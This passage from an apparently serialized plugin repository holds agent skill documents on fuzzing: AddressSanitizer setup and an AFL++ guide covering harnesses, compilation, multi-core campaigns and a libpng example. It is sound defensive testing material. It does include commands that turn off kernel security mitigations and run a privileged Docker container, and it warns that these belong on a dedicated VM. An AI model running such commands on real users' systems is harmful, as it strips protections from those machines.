  cargo-fuzz -.-> libfuzzer\n    cargo-fuzz -.-> aflpp\n    cargo-fuzz -.-> libafl\n    libafl -.-> libfuzzer\n    libafl -.-> aflpp\n    libafl -.-> cargo-fuzz\n    ruzzy -.-> libfuzzer\n    ruzzy -.-> aflpp\n\n    %% Tool  Tool alternatives\n    semgrep -.-> codeql\n    codeql -.-> semgrep\n\n    %% Technique  Fuzzer references\n    harness-writing --> libfuzzer\n    harness-writing --> aflpp\n    harness-writing --> cargo-fuzz\n    harness-writing --> atheris\n    harness-writing --> ossfuzz\n    fuzzing-dictionary --> libfuzzer\n    fuzzing-dictionary --> aflpp\n    fuzzing-dictionary --> cargo-fuzz\n    fuzzing-obstacles --> libfuzzer\n    fuzzing-obstacles --> aflpp\n    fuzzing-obstacles --> cargo-fuzz\n    ossfuzz --> libfuzzer\n    ossfuzz --> aflpp\n    ossfuzz --> cargo-fuzz\n    ossfuzz --> atheris\n\n    %% Technique cross-references\n    harness-writing --> address-sanitizer\n    harness-writing --> coverage-analysis\n    harness-writing --> fuzzing-dictionary\n    harness-writing --> fuzzing-obstacles\n    fuzzing-dictionary --> coverage-analysis\n    fuzzing-dictionary --> harness-writing\n    address-sanitizer --> coverage-analysis\n    ossfuzz --> address-sanitizer\n    ossfuzz --> coverage-analysis\n\n    %% Domain  Technique references\n    wycheproof --> coverage-analysis\n    constant-time-testing --> coverage-analysis\n```\n\n**Legend:**\n- Solid arrows (``): Primary dependencies (techniques, tools used together)\n- Dashed arrows (`-.->`): Alternative suggestions (similar tools/fuzzers)\n\n**Generated Skills Summary:**\n\n| Type | Skills |\n|------|--------|\n| Fuzzers (6) | libfuzzer, aflpp, libafl, cargo-fuzz, atheris, ruzzy |\n| Techniques (6) | harness-writing, address-sanitizer, coverage-analysis, fuzzing-dictionary, fuzzing-obstacles, ossfuzz |\n| Tools (2) | semgrep, codeql |\n| Domain (2) | wycheproof, constant-time-testing |\n\n**Note:** Some skills reference planned/external skills not yet generated (e.g., `honggfuzz`, `fuzzing-corpus`, `sarif-parsing`). Run `validate-skills.py` to see the full list.\n\n## Configuration\n\nThe skill will automatically:\n1. Check common locations (`./testing-handbook`, `../testing-handbook`, `~/testing-handbook`)\n2. Ask the user for the path if not found\n3. Clone from GitHub as last resort: `https://github.com/trailofbits/testing-handbook`\n\nNo hardcoded paths are used - the skill adapts to your environment.\n\n## Author\n\nPawe Patek\n\n## License\n\nSee repository license.\n",
        "plugins/testing-handbook-skills/skills/address-sanitizer/SKILL.md": "---\nname: address-sanitizer\ntype: technique\ndescription: >\n  AddressSanitizer detects memory errors during fuzzing.\n  Use when fuzzing C/C++ code to find buffer overflows and use-after-free bugs.\n---\n\n# AddressSanitizer (ASan)\n\nAddressSanitizer (ASan) is a widely adopted memory error detection tool used extensively during software testing, particularly fuzzing. It helps detect memory corruption bugs that might otherwise go unnoticed, such as buffer overflows, use-after-free errors, and other memory safety violations.\n\n## Overview\n\nASan is a standard practice in fuzzing due to its effectiveness in identifying memory vulnerabilities. It instruments code at compile time to track memory allocations and accesses, detecting illegal operations at runtime.\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| Instrumentation | ASan adds runtime checks to memory operations during compilation |\n| Shadow Memory | Maps 20TB of virtual memory to track allocation state |\n| Performance Cost | Approximately 2-4x slowdown compared to non-instrumented code |\n| Detection Scope | Finds buffer overflows, use-after-free, double-free, and memory leaks |\n\n## When to Apply\n\n**Apply this technique when:**\n- Fuzzing C/C++ code for memory safety vulnerabilities\n- Testing Rust code with unsafe blocks\n- Debugging crashes related to memory corruption\n- Running unit tests where memory errors are suspected\n\n**Skip this technique when:**\n- Running production code (ASan can reduce security)\n- Platform is Windows or macOS (limited ASan support)\n- Performance overhead is unacceptable for your use case\n- Fuzzing pure safe languages without FFI (e.g., pure Go, pure Java)\n\n## Quick Reference\n\n| Task | Command/Pattern |\n|------|-----------------|\n| Enable ASan (Clang/GCC) | `-fsanitize=address` |\n| Enable verbosity | `ASAN_OPTIONS=verbosity=1` |\n| Disable leak detection | `ASAN_OPTIONS=detect_leaks=0` |\n| Force abort on error | `ASAN_OPTIONS=abort_on_error=1` |\n| Multiple options | `ASAN_OPTIONS=verbosity=1:abort_on_error=1` |\n\n## Step-by-Step\n\n### Step 1: Compile with ASan\n\nCompile and link your code with the `-fsanitize=address` flag:\n\n```bash\nclang -fsanitize=address -g -o my_program my_program.c\n```\n\nThe `-g` flag is recommended to get better stack traces when ASan detects errors.\n\n### Step 2: Configure ASan Options\n\nSet the `ASAN_OPTIONS` environment variable to configure ASan behavior:\n\n```bash\nexport ASAN_OPTIONS=verbosity=1:abort_on_error=1:detect_leaks=0\n```\n\n### Step 3: Run Your Program\n\nExecute the ASan-instrumented binary. When memory errors are detected, ASan will print detailed reports:\n\n```bash\n./my_program\n```\n\n### Step 4: Adjust Fuzzer Memory Limits\n\nASan requires approximately 20TB of virtual memory. Disable fuzzer memory restrictions:\n\n- libFuzzer: `-rss_limit_mb=0`\n- AFL++: `-m none`\n\n## Common Patterns\n\n### Pattern: Basic ASan Integration\n\n**Use Case:** Standard fuzzing setup with ASan\n\n**Before:**\n```bash\nclang -o fuzz_target fuzz_target.c\n./fuzz_target\n```\n\n**After:**\n```bash\nclang -fsanitize=address -g -o fuzz_target fuzz_target.c\nASAN_OPTIONS=verbosity=1:abort_on_error=1 ./fuzz_target\n```\n\n### Pattern: ASan with Unit Tests\n\n**Use Case:** Enable ASan for unit test suite\n\n**Before:**\n```bash\ngcc -o test_suite test_suite.c -lcheck\n./test_suite\n```\n\n**After:**\n```bash\ngcc -fsanitize=address -g -o test_suite test_suite.c -lcheck\nASAN_OPTIONS=detect_leaks=1 ./test_suite\n```\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Use `-g` flag | Provides detailed stack traces for debugging |\n| Set `verbosity=1` | Confirms ASan is enabled before program starts |\n| Disable leaks during fuzzing | Leak detection doesn't cause immediate crashes, clutters output |\n| Enable `abort_on_error=1` | Some fuzzers require `abort()` instead of `_exit()` |\n\n### Understanding ASan Reports\n\nWhen ASan detects a memory error, it prints a detailed report including:\n\n- **Error type**: Buffer overflow, use-after-free, etc.\n- **Stack trace**: Where the error occurred\n- **Allocation/deallocation traces**: Where memory was allocated/freed\n- **Memory map**: Shadow memory state around the error\n\nExample ASan report:\n```\n==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60300000eff4 at pc 0x00000048e6a3\nREAD of size 4 at 0x60300000eff4 thread T0\n    #0 0x48e6a2 in main /path/to/file.c:42\n```\n\n### Combining Sanitizers\n\nASan can be combined with other sanitizers for comprehensive detection:\n\n```bash\nclang -fsanitize=address,undefined -g -o fuzz_target fuzz_target.c\n```\n\n### Platform-Specific Considerations\n\n**Linux**: Full ASan support with best performance\n**macOS**: Limited support, some features may not work\n**Windows**: Experimental support, not recommended for production fuzzing\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| Using ASan in production | Can make applications less secure | Use ASan only for testing |\n| Not disabling memory limits | Fuzzer may kill process due to 20TB virtual memory | Set `-rss_limit_mb=0` or `-m none` |\n| Ignoring leak reports | Memory leaks indicate resource management issues | Review leak reports at end of fuzzing campaign |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\nCompile with both fuzzer and address sanitizer:\n\n```bash\nclang++ -fsanitize=fuzzer,address -g harness.cc -o fuzz\n```\n\nRun with unlimited RSS:\n\n```bash\n./fuzz -rss_limit_mb=0\n```\n\n**Integration tips:**\n- Always combine `-fsanitize=fuzzer` with `-fsanitize=address`\n- Use `-g` for detailed stack traces in crash reports\n- Consider `ASAN_OPTIONS=abort_on_error=1` for better crash handling\n\nSee: [libFuzzer: AddressSanitizer](https://github.com/google/fuzzing/blob/master/docs/good-fuzz-target.md#memory-error-detection)\n\n### AFL++\n\nUse the `AFL_USE_ASAN` environment variable:\n\n```bash\nAFL_USE_ASAN=1 afl-clang-fast++ -g harness.cc -o fuzz\n```\n\nRun with unlimited memory:\n\n```bash\nafl-fuzz -m none -i input_dir -o output_dir ./fuzz\n```\n\n**Integration tips:**\n- `AFL_USE_ASAN=1` automatically adds proper compilation flags\n- Use `-m none` to disable AFL++'s memory limit\n- Consider `AFL_MAP_SIZE` for programs with large coverage maps\n\nSee: [AFL++: AddressSanitizer](https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#a-using-sanitizers)\n\n### cargo-fuzz (Rust)\n\nUse the `--sanitizer=address` flag:\n\n```bash\ncargo fuzz run fuzz_target --sanitizer=address\n```\n\nOr configure in `fuzz/Cargo.toml`:\n\n```toml\n[profile.release]\nopt-level = 3\ndebug = true\n```\n\n**Integration tips:**\n- ASan is useful for fuzzing unsafe Rust code or FFI boundaries\n- Safe Rust code may not benefit as much (compiler already prevents many errors)\n- Focus on unsafe blocks, raw pointers, and C library bindings\n\nSee: [cargo-fuzz: AddressSanitizer](https://rust-fuzz.github.io/book/cargo-fuzz/tutorial.html#sanitizers)\n\n### honggfuzz\n\nCompile with ASan and link with honggfuzz:\n\n```bash\nhonggfuzz -i input_dir -o output_dir -- ./fuzz_target_asan\n```\n\nCompile the target:\n\n```bash\nhfuzz-clang -fsanitize=address -g target.c -o fuzz_target_asan\n```\n\n**Integration tips:**\n- honggfuzz works well with ASan out of the box\n- Use feedback-driven mode for better coverage with sanitizers\n- Monitor memory usage, as ASan increases memory footprint\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| Fuzzer kills process immediately | Memory limit too low for ASan's 20TB virtual memory | Use `-rss_limit_mb=0` (libFuzzer) or `-m none` (AFL++) |\n| \"ASan runtime not initialized\" | Wrong linking order or missing runtime | Ensure `-fsanitize=address` used in both compile and link |\n| Leak reports clutter output | LeakSanitizer enabled by default | Set `ASAN_OPTIONS=detect_leaks=0` |\n| Poor performance (>4x slowdown) | Debug mode or unoptimized build | Compile with `-O2` or `-O3` alongside `-fsanitize=address` |\n| ASan not detecting obvious bugs | Binary not instrumented | Check with `ASAN_OPTIONS=verbosity=1` that ASan prints startup info |\n| False positives | Interceptor conflicts | Check ASan FAQ for known issues with specific libraries |\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Compile with `-fsanitize=fuzzer,address` for integrated fuzzing with memory error detection |\n| **aflpp** | Use `AFL_USE_ASAN=1` environment variable during compilation |\n| **cargo-fuzz** | Use `--sanitizer=address` flag to enable ASan for Rust fuzz targets |\n| **honggfuzz** | Compile target with `-fsanitize=address` for ASan-instrumented fuzzing |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **undefined-behavior-sanitizer** | Often used together with ASan for comprehensive bug detection (undefined behavior + memory errors) |\n| **fuzz-harness-writing** | Harnesses must be designed to handle ASan-detected crashes and avoid false positives |\n| **coverage-analysis** | Coverage-guided fuzzing helps trigger code paths where ASan can detect memory errors |\n\n## Resources\n\n### Key External Resources\n\n**[AddressSanitizer on Google Sanitizers Wiki](https://github.com/google/sanitizers/wiki/AddressSanitizer)**\n\nThe official ASan documentation covers:\n- Algorithm and implementation details\n- Complete list of detected error types\n- Performance characteristics and overhead\n- Platform-specific behavior\n- Known limitations and incompatibilities\n\n**[SanitizerCommonFlags](https://github.com/google/sanitizers/wiki/SanitizerCommonFlags)**\n\nCommon configuration flags shared across all sanitizers:\n- `verbosity`: Control diagnostic output level\n- `log_path`: Redirect sanitizer output to files\n- `symbolize`: Enable/disable symbol resolution in reports\n- `external_symbolizer_path`: Use custom symbolizer\n\n**[AddressSanitizerFlags](https://github.com/google/sanitizers/wiki/AddressSanizerFlags)**\n\nASan-specific configuration options:\n- `detect_leaks`: Control memory leak detection\n- `abort_on_error`: Call `abort()` vs `_exit()` on error\n- `detect_stack_use_after_return`: Detect stack use-after-return bugs\n- `check_initialization_order`: Find initialization order bugs\n\n**[AddressSanitizer FAQ](https://github.com/google/sanitizers/wiki/AddressSanitizer#faq)**\n\nCommon pitfalls and solutions:\n- Linking order issues\n- Conflicts with other tools\n- Platform-specific problems\n- Performance tuning tips\n\n**[Clang AddressSanitizer Documentation](https://clang.llvm.org/docs/AddressSanitizer.html)**\n\nClang-specific guidance:\n- Compilation flags and options\n- Interaction with other Clang features\n- Supported platforms and architectures\n\n**[GCC Instrumentation Options](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html#index-fsanitize_003daddress)**\n\nGCC-specific ASan documentation:\n- GCC-specific flags and behavior\n- Differences from Clang implementation\n- Platform support in GCC\n\n**[AddressSanitizer: A Fast Address Sanity Checker (USENIX Paper)](https://www.usenix.org/sites/default/files/conference/protected-files/serebryany_atc12_slides.pdf)**\n\nOriginal research paper with technical details:\n- Shadow memory algorithm\n- Virtual memory requirements (historically 16TB, now ~20TB)\n- Performance benchmarks\n- Design decisions and tradeoffs\n",
        "plugins/testing-handbook-skills/skills/aflpp/SKILL.md": "---\nname: aflpp\ntype: fuzzer\ndescription: >\n  AFL++ is a fork of AFL with better fuzzing performance and advanced features.\n  Use for multi-core fuzzing of C/C++ projects.\n---\n\n# AFL++\n\nAFL++ is a fork of the original AFL fuzzer that offers better fuzzing performance and more advanced features while maintaining stability. A major benefit over libFuzzer is that AFL++ has stable support for running fuzzing campaigns on multiple cores, making it ideal for large-scale fuzzing efforts.\n\n## When to Use\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| AFL++ | Multi-core fuzzing, diverse mutations, mature projects | Medium |\n| libFuzzer | Quick setup, single-threaded, simple harnesses | Low |\n| LibAFL | Custom fuzzers, research, advanced use cases | High |\n\n**Choose AFL++ when:**\n- You need multi-core fuzzing to maximize throughput\n- Your project can be compiled with Clang or GCC\n- You want diverse mutation strategies and mature tooling\n- libFuzzer has plateaued and you need more coverage\n- You're fuzzing production codebases that benefit from parallel execution\n\n## Quick Start\n\n```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Call your code with fuzzer-provided data\n    check_buf((char*)data, size);\n    return 0;\n}\n```\n\nCompile and run:\n```bash\n# Setup AFL++ wrapper script first (see Installation)\n./afl++ docker afl-clang-fast++ -DNO_MAIN=1 -O2 -fsanitize=fuzzer harness.cc main.cc -o fuzz\nmkdir seeds && echo \"aaaa\" > seeds/minimal_seed\n./afl++ docker afl-fuzz -i seeds -o out -- ./fuzz\n```\n\n## Installation\n\nAFL++ has many dependencies including LLVM, Python, and Rust. We recommend using a current Debian or Ubuntu distribution for fuzzing with AFL++.\n\n| Method | When to Use | Supported Compilers |\n|--------|-------------|---------------------|\n| Ubuntu/Debian repos | Recent Ubuntu, basic features only | Ubuntu 23.10: Clang 14 & GCC 13<br>Debian 12: Clang 14 & GCC 12 |\n| Docker (from Docker Hub) | Specific AFL++ version, Apple Silicon support | As of 4.35c: Clang 19 & GCC 11 |\n| Docker (from source) | Test unreleased features, apply patches | Configurable in Dockerfile |\n| From source | Avoid Docker, need specific patches | Adjustable via `LLVM_CONFIG` env var |\n\n### Ubuntu/Debian\n\nPrior to installing afl++, check the clang version dependency of the packge with `apt-cache show afl++`, and install the matching `lld` version (e.g., `lld-17`).\n\n\n```bash\napt install afl++ lld-17\n```\n\n\n### Docker (from Docker Hub)\n\n```bash\ndocker pull aflplusplus/aflplusplus:stable\n```\n\n### Docker (from source)\n\n```bash\ngit clone --depth 1 --branch stable https://github.com/AFLplusplus/AFLplusplus\ncd AFLplusplus\ndocker build -t aflplusplus .\n```\n\n### From source\n\nRefer to the [Dockerfile](https://github.com/AFLplusplus/AFLplusplus/blob/stable/Dockerfile) for Ubuntu version requirements and dependencies. Set `LLVM_CONFIG` to specify Clang version (e.g., `llvm-config-18`).\n\n### Wrapper Script Setup\n\nCreate a wrapper script to run AFL++ on host or Docker:\n\n```bash\ncat <<'EOF' > ./afl++\n#!/bin/sh\nAFL_VERSION=\"${AFL_VERSION:-\"stable\"}\"\ncase \"$1\" in\n   host)\n        shift\n        bash -c \"$*\"\n        ;;\n    docker)\n        shift\n        /usr/bin/env docker run -ti \\\n            --privileged \\\n            -v ./:/src \\\n            --rm \\\n            --name afl_fuzzing \\\n            \"aflplusplus/aflplusplus:$AFL_VERSION\" \\\n            bash -c \"cd /src && bash -c \\\"$*\\\"\"\n        ;;\n    *)\n        echo \"Usage: $0 {host|docker}\"\n        exit 1\n        ;;\nesac\nEOF\nchmod +x ./afl++\n```\n\n**Security Warning:** The `afl-system-config` and `afl-persistent-config` scripts require root privileges and disable OS security features. Do not fuzz on production systems or your development environment. Use a dedicated VM instead.\n\n### System Configuration\n\nRun after each reboot for up to 15% more executions per second:\n\n```bash\n./afl++ <host/docker> afl-system-config\n```\n\nFor maximum performance, disable kernel security mitigations (requires grub bootloader, not supported in Docker):\n\n```bash\n./afl++ host afl-persistent-config\nupdate-grub\nreboot\n./afl++ <host/docker> afl-system-config\n```\n\nVerify with `cat /proc/cmdline` - output should include `mitigations=off`.\n\n## Writing a Harness\n\n### Harness Structure\n\nAFL++ supports libFuzzer-style harnesses:\n\n```c++\n#include <stdint.h>\n#include <stddef.h>\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // 1. Validate input size if needed\n    if (size < MIN_SIZE || size > MAX_SIZE) return 0;\n\n    // 2. Call target function with fuzz data\n    target_function(data, size);\n\n    // 3. Return 0 (non-zero reserved for future use)\n    return 0;\n}\n```\n\n### Harness Rules\n\n| Do | Don't |\n|----|-------|\n| Reset global state between runs | Rely on state from previous runs |\n| Handle edge cases gracefully | Exit on invalid input |\n| Keep harness deterministic | Use random number generators |\n| Free allocated memory | Create memory leaks |\n| Validate input sizes | Process unbounded input |\n\n> **See Also:** For detailed harness writing techniques, patterns for handling complex inputs,\n> and advanced strategies, see the **fuzz-harness-writing** technique skill.\n\n## Compilation\n\nAFL++ offers multiple compilation modes with different trade-offs.\n\n### Compilation Mode Decision Tree\n\nChoose your compilation mode:\n- **LTO mode** (`afl-clang-lto`): Best performance and instrumentation. Try this first.\n- **LLVM mode** (`afl-clang-fast`): Fall back if LTO fails to compile.\n- **GCC plugin** (`afl-gcc-fast`): For projects requiring GCC.\n\n### Basic Compilation (LLVM mode)\n\n```bash\n./afl++ <host/docker> afl-clang-fast++ -DNO_MAIN=1 -O2 -fsanitize=fuzzer harness.cc main.cc -o fuzz\n```\n\n### GCC Compilation\n\n```bash\n./afl++ <host/docker> afl-g++-fast -DNO_MAIN=1 -O2 -fsanitize=fuzzer harness.cc main.cc -o fuzz\n```\n\n**Important:** GCC version must match the version used to compile the AFL++ GCC plugin.\n\n### With Sanitizers\n\n```bash\n./afl++ <host/docker> AFL_USE_ASAN=1 afl-clang-fast++ -DNO_MAIN=1 -O2 -fsanitize=fuzzer harness.cc main.cc -o fuzz\n```\n\n> **See Also:** For detailed sanitizer configuration, common issues, and advanced flags,\n> see the **address-sanitizer** and **undefined-behavior-sanitizer** technique skills.\n\n### Build Flags\n\nNote that `-g` is not necessary, it is added by default by the AFL++ compilers.\n\n| Flag | Purpose |\n|------|---------|\n| `-DNO_MAIN=1` | Skip main function when using libFuzzer harness |\n| `-O2` | Production optimization level (recommended for fuzzing) |\n| `-fsanitize=fuzzer` | Enable libFuzzer compatibility mode and adds the fuzzer runtime when linking executable |\n| `-fsanitize=fuzzer-no-link` | Instrument without linking fuzzer runtime (for static libraries and object files) |\n\n## Corpus Management\n\n### Creating Initial Corpus\n\nAFL++ requires at least one non-empty seed file:\n\n```bash\nmkdir seeds\necho \"aaaa\" > seeds/minimal_seed\n```\n\nFor real projects, gather representative inputs:\n- Download example files for the format you're fuzzing\n- Extract test cases from the project's test suite\n- Use minimal valid inputs for your file format\n\n### Corpus Minimization\n\nAfter a campaign, minimize the corpus to keep only unique coverage:\n\n```bash\n./afl++ <host/docker> afl-cmin -i out/default/queue -o minimized_corpus -- ./fuzz\n```\n\n> **See Also:** For corpus creation strategies, dictionaries, and seed selection,\n> see the **fuzzing-corpus** technique skill.\n\n## Running Campaigns\n\n### Basic Run\n\n```bash\n./afl++ <host/docker> afl-fuzz -i seeds -o out -- ./fuzz\n```\n\n### Setting Environment Variables\n\n```bash\n./afl++ <host/docker> AFL_FAST_CAL=1 afl-fuzz -i seeds -o out -- ./fuzz\n```\n\n### Interpreting Output\n\nThe AFL++ UI shows real-time fuzzing statistics:\n\n| Output | Meaning |\n|--------|---------|\n| **execs/sec** | Execution speed - higher is better |\n| **cycles done** | Number of queue passes completed |\n| **corpus count** | Number of unique test cases in queue |\n| **saved crashes** | Number of unique crashes found |\n| **stability** | % of stable edges (should be near 100%) |\n\n### Output Directory Structure\n\n```text\nout/default/\n cmdline          # How was the SUT invoked?\n crashes/         # Inputs that crash the SUT\n    id:000000,sig:06,src:000002,time:286,execs:13105,op:havoc,rep:4\n hangs/           # Inputs that hang the SUT\n queue/           # Test cases reproducing final fuzzer state\n    id:000000,time:0,execs:0,orig:minimal_seed\n    id:000001,src:000000,time:0,execs:8,op:havoc,rep:6,+cov\n fuzzer_stats     # Campaign statistics\n plot_data        # Data for plotting\n```\n\n### Analyzing Results\n\nView live campaign statistics:\n\n```bash\n./afl++ <host/docker> afl-whatsup out\n```\n\nCreate coverage plots:\n\n```bash\napt install gnuplot\n./afl++ <host/docker> afl-plot out/default out_graph/\n```\n\n### Re-executing Test Cases\n\n```bash\n./afl++ <host/docker> ./fuzz out/default/crashes/<test_case>\n```\n\n### Fuzzer Options\n\n| Option | Purpose |\n|--------|---------|\n| `-G 4000` | Maximum test input length (default: 1048576 bytes) |\n| `-t 1000` | Timeout in milliseconds for each test case (default: 1000ms) |\n| `-m 1000` | Memory limit in megabytes (default: 0 = unlimited) |\n| `-x ./dict.dict` | Use dictionary file to guide mutations |\n\n## Multi-Core Fuzzing\n\nAFL++ excels at multi-core fuzzing with two major advantages:\n1. More executions per second (scales linearly with physical cores)\n2. Asymmetrical fuzzing (e.g., one ASan job, rest without sanitizers)\n\n### Starting a Campaign\n\nStart the primary fuzzer (in background):\n\n```bash\n./afl++ <host/docker> afl-fuzz -M primary -i seeds -o state -- ./fuzz 1>primary.log 2>primary.error &\n```\n\nStart secondary fuzzers (as many as you have cores):\n\n```bash\n./afl++ <host/docker> afl-fuzz -S secondary01 -i seeds -o state -- ./fuzz 1>secondary01.log 2>secondary01.error &\n./afl++ <host/docker> afl-fuzz -S secondary02 -i seeds -o state -- ./fuzz 1>secondary02.log 2>secondary02.error &\n```\n\n### Monitoring Multi-Core Campaigns\n\nList all running jobs:\n\n```bash\njobs\n```\n\nView live statistics (updates every second):\n\n```bash\n./afl++ <host/docker> watch -n1 --color afl-whatsup state/\n```\n\n### Stopping All Fuzzers\n\n```bash\nkill $(jobs -p)\n```\n\n## Coverage Analysis\n\nAFL++ automatically tracks coverage through edge instrumentation. Coverage information is stored in `fuzzer_stats` and `plot_data`.\n\n### Measuring Coverage\n\nUse `afl-plot` to visualize coverage over time:\n\n```bash\n./afl++ <host/docker> afl-plot out/default out_graph/\n```\n\n### Improving Coverage\n\n- Use dictionaries for format-aware fuzzing\n- Run longer campaigns (cycles_wo_finds indicates plateau)\n- Try different mutation strategies with multi-core fuzzing\n- Analyze coverage gaps and add targeted seed inputs\n\n> **See Also:** For detailed coverage analysis techniques, identifying coverage gaps,\n> and systematic coverage improvement, see the **coverage-analysis** technique skill.\n\n## CMPLOG\n\nCMPLOG/RedQueen is the best path constraint solving mechanism available in any fuzzer.\nTo enable it, the fuzz target needs to be instrumented for it.\nBefore building the fuzzing target set the environment variable:\n\n```bash\n./afl++ <host/docker> AFL_LLVM_CMPLOG=1 make\n```\n\nNo special action is needed for compiling and linking the harness.\n\nTo run a fuzzer instance with a CMPLOG instrumented fuzzing target, add `-c0` to the command like arguments:\n\n```bash\n./afl++ <host/docker> afl-fuzz -c0 -S cmplog -i seeds -o state -- ./fuzz 1>secondary02.log 2>secondary02.error &\n```\n\n## Sanitizer Integration\n\nSanitizers are essential for finding memory corruption bugs that don't cause immediate crashes.\n\n### AddressSanitizer (ASan)\n\n```bash\n./afl++ <host/docker> AFL_USE_ASAN=1 afl-clang-fast++ -DNO_MAIN=1 -O2 -fsanitize=fuzzer harness.cc main.cc -o fuzz\n```\n\n**Note:** Memory limit (`-m`) is not supported with ASan due to 20TB virtual memory reservation.\n\n### UndefinedBehaviorSanitizer (UBSan)\n\n```bash\n./afl++ <host/docker> AFL_USE_UBSAN=1 afl-clang-fast++ -DNO_MAIN=1 -O2 -fsanitize=fuzzer,undefined harness.cc main.cc -o fuzz\n```\n\n### Common Sanitizer Issues\n\n| Issue | Solution |\n|-------|----------|\n| ASan slows fuzzing | Use only 1 ASan job in multi-core setup |\n| Stack exhaustion | Increase stack with `ASAN_OPTIONS=stack_size=...` |\n| GCC version mismatch | Ensure system GCC matches AFL++ plugin version |\n\n> **See Also:** For comprehensive sanitizer configuration and troubleshooting,\n> see the **address-sanitizer** technique skill.\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Use LLVMFuzzerTestOneInput harnesses where possible | If a fuzzing campaign has at least 85% stability then this is the most efficient fuzzing style. If not then try standard input or file input fuzzing |\n| Use dictionaries | Helps fuzzer discover format-specific keywords and magic bytes |\n| Set realistic timeouts | Prevents false positives from system load |\n| Limit input size | Larger inputs don't necessarily explore more space |\n| Monitor stability | Low stability indicates non-deterministic behavior |\n\n### Standard Input Fuzzing\n\nAFL++ can fuzz programs reading from stdin without a libFuzzer harness:\n\n```bash\n./afl++ <host/docker> afl-clang-fast++ -O2 main_stdin.c -o fuzz_stdin\n./afl++ <host/docker> afl-fuzz -i seeds -o out -- ./fuzz_stdin\n```\n\nThis is slower than persistent mode but requires no harness code.\n\n### File Input Fuzzing\n\nFor programs that read files, use `@@` placeholder:\n\n```bash\n./afl++ <host/docker> afl-clang-fast++ -O2 main_file.c -o fuzz_file\n./afl++ <host/docker> afl-fuzz -i seeds -o out -- ./fuzz_file @@\n```\n\nFor better performance, use `fmemopen` to create file descriptors from memory.\n\n### Argument Fuzzing\n\nFuzz command-line arguments using `argv-fuzz-inl.h`:\n\n```c++\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#ifdef __AFL_COMPILER\n#include \"argv-fuzz-inl.h\"\n#endif\n\nvoid check_buf(char *buf, size_t buf_len) {\n    if(buf_len > 0 && buf[0] == 'a') {\n        if(buf_len > 1 && buf[1] == 'b') {\n            if(buf_len > 2 && buf[2] == 'c') {\n                abort();\n            }\n        }\n    }\n}\n\nint main(int argc, char *argv[]) {\n#ifdef __AFL_COMPILER\n    AFL_INIT_ARGV();\n#endif\n\n    if (argc < 2) {\n        fprintf(stderr, \"Usage: %s <input_string>\\n\", argv[0]);\n        return 1;\n    }\n\n    char *input_buf = argv[1];\n    size_t len = strlen(input_buf);\n    check_buf(input_buf, len);\n    return 0;\n}\n```\n\nDownload the header:\n\n```bash\ncurl -O https://raw.githubusercontent.com/AFLplusplus/AFLplusplus/stable/utils/argv_fuzzing/argv-fuzz-inl.h\n```\n\nCompile and run:\n\n```bash\n./afl++ <host/docker> afl-clang-fast++ -O2 main_arg.c -o fuzz_arg\n./afl++ <host/docker> afl-fuzz -i seeds -o out -- ./fuzz_arg\n```\n\n### Performance Tuning\n\n| Setting | Impact |\n|---------|--------|\n| CPU core count | Linear scaling with physical cores |\n| Persistent mode | 10-20x faster than fork server |\n| `-G` input size limit | Smaller = faster, but may miss bugs |\n| ASan ratio | 1 ASan job per 4-8 non-ASan jobs |\n\n## Real-World Examples\n\n### Example: libpng\n\nFuzzing libpng demonstrates fuzzing a C project with static libraries:\n\n```bash\n# Get source\ncurl -L -O https://downloads.sourceforge.net/project/libpng/libpng16/1.6.37/libpng-1.6.37.tar.xz\ntar xf libpng-1.6.37.tar.xz\ncd libpng-1.6.37/\n\n# Install dependencies\napt install zlib1g-dev\n\n# Configure and build static library\nexport CC=afl-clang-fast CFLAGS=-fsanitize=fuzzer-no-link\nexport CXX=afl-clang-fast++ CXXFLAGS=\"$CFLAGS\"\n./configure --enable-shared=no\nexport AFL_LLVM_CMPLOG=1\nexport AFL_USE_ASAN=1\nmake\n\n# Download harness\ncurl -O https://raw.githubusercontent.com/glennrp/libpng/f8e5fa92b0e37ab597616f554bee254157998227/contrib/oss-fuzz/libpng_read_fuzzer.cc\n\n# Link fuzzer\nexport AFL_USE_ASAN=1\n$CXX -fsanitize=fuzzer libpng_read_fuzzer.cc .libs/libpng16.a -lz -o fuzz\n\n# Prepare seeds and dictionary\nmkdir seeds/\ncurl -o seeds/input.png https://raw.githubusercontent.com/glennrp/libpng/acfd50ae0ba3198ad734e5d4dec2b05341e50924/contrib/pngsuite/iftp1n3p08.png\ncurl -O https://raw.githubusercontent.com/glennrp/libpng/2fff013a6935967960a5ae626fc21432807933dd/contrib/oss-fuzz/png.dict\n\n# Start fuzzing\n./afl++ <host/docker> afl-fuzz -i seeds -o out -- ./fuzz\n```\n\n### Example: CMake-based Project\n\n```cmake\nproject(BuggyProgram)\ncmake_minimum_required(VERSION 3.0)\n\nadd_executable(buggy_program main.cc)\n\nadd_executable(fuzz main.cc harness.cc)\ntarget_compile_definitions(fuzz PRIVATE NO_MAIN=1)\ntarget_compile_options(fuzz PRIVATE -O2 -fsanitize=fuzzer-no-link)\ntarget_link_libraries(fuzz -fsanitize=fuzzer)\n```\n\nBuild and fuzz:\n\n```bash\n# Build non-instrumented binary\n./afl++ <host/docker> cmake -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ .\n./afl++ <host/docker> cmake --build . --target buggy_program\n\n# Build fuzzer\n./afl++ <host/docker> cmake 